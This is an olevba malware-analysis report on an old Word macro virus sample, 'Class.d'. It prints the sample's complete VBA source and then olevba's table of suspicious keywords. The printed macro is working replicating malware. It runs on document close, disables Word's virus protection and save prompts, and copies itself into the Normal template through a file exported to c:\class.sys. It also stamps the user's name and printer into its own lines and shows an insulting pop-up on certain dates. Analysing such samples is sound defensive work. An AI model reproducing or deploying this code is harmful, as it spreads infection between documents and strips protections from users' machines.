olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-f4788b6950c4e58d20c14280a252d5a93b0695ef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-f4788b6950c4e58d20c14280a252d5a93b0695ef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
On Error GoTo out
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
Options.VirusProtection = False
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
Options.SaveNormalPrompt = False
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
Options.ConfirmConversions = False
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
If nt > 70 And ad > 0 Then GoTo out
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
If nt < 70 Then
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
End If
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
host.CodeModule.AddFromFile ("c:\class.sys")
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
With host.CodeModule
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    For x = 1 To 4
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    .deletelines 1
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    Next x
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
End With
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
If nt < 70 Then
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    With host.CodeModule
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    .replaceline 1, "Sub AutoClose()"
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    .replaceline 91, "Sub ToolsMacro()"
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    For x = 70 To 81
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
        .deletelines 62
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    Next x
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    .replaceline 35, "    For x = 1 To 4"
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    End With
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
End If
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
With host.CodeModule
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    For x = 2 To 104 Step 2
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
    Next x
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
End With
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
out:
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Vesselin Vladimirov Bontchev23.04.99 01:45:57HP LaserJet 5/5M - Enhanced on \\PRINTER\HPDoc1.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

